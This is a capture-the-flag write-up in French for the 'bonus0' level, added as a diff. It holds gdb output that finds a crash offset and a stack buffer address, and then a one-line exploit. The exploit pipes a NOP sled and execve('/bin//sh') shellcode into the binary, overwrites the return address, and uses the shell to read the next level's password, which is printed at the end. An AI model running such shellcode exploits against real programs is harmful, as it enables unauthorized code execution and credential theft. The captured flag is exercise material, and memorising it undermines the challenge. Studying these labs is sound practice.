@@ -1,0 +1,46 @@
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0
+ -
+01234567890123456789
+ -
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+01234567890123456789ABCDEFGHIJKLMNOPQRST�� ABCDEFGHIJKLMNOPQRST��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x4d4c4b4a in ?? ()
+(gdb)
+
+4a = J donc l'offset est de 9.
+
+
+Il me faut l'adresse du buffer de 4096:
+
+Je pose un breakpoint a p+28 et j'examine ebp-1008
+
+(gdb) b *p+28
+Breakpoint 1 at 0x80484d0
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+
+Breakpoint 1, 0x080484d0 in p ()
+(gdb) x $ebp-0x1008
+0xbfffe650:	0x00000000
+
+
+buffer address = 0xbfffe650
+
+Donc cette adresse est le debut du buffer, je peux utiliser cette adresse + 61 soit (0xbfffe6bd) 
+J'ajoute un 'cat' a la fin de l'exploitation pour maintenir le shell ouvert.
+
+
+L'exploitation est la suivante:
+
+$> (python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; python -c 'print "B" * 9 + "\xbd\xe6\xff\xbf" + "C" * 7'; cat ) | ./bonus0
+ -
+ -
+��������������������BBBBBBBBB����CCCCCCC�� BBBBBBBBB����CCCCCCC��
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
